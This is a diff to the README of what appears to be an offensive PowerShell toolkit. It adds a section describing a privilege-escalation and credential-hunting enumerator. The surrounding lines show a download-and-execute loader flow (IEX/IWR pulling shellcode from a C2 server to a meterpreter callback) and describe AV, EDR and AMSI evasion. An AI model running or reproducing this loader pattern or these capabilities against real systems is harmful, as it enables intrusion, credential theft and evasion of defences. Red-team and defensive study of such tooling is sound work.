@@ -52,6 +52,19 @@ The `i5_syscall.ps1` scripts provide **ntdll-level syscall injection** for loadi
 
 **Flow:** `IEX(IWR .../i5_syscall.ps1)` → downloads `shellcode.txt` from C2 → injects at ntdll level → meterpreter/agent callback
 
+### Reconnaissance & Privilege Escalation
+- **`CyberEnum.ps1`** - Comprehensive Windows + AD privesc enumerator (PowerShell v3+):
+  - System info, user context, dangerous privileges (SeImpersonate, SeDebug, etc.)
+  - UAC bypass methods (registry hijack, scheduled task, DLL hijacking)
+  - Security software detection (Defender, AMSI, AppLocker, WDAC, third-party AV/EDR)
+  - Credential hunting (cmdkey, Windows Vault, browser saved passwords, WiFi keys, unattend.xml, registry autologon)
+  - Network recon (adapters, listening ports, ARP cache for lateral targets)
+  - Service misconfigs (unquoted paths, writable binaries, SYSTEM services)
+  - Active Directory enumeration (domain controllers, domain admins, Kerberoastable SPNs)
+  - WSL exploitation vectors
+  - HTML report export (`-ExportHTML`) and quick mode (`-Quick`)
+- **`privesc_enum.ps1`** - Lightweight privesc checker
+
 ### Evasion & Delivery
 - **NT syscall-direct injection** - Calls ntdll directly, bypasses all userland hooks (AV, EDR, ETW, AMSI)
 - **AMSI memory patch** - Runtime AMSI unhooking via `AmsiScanBuffer` patch
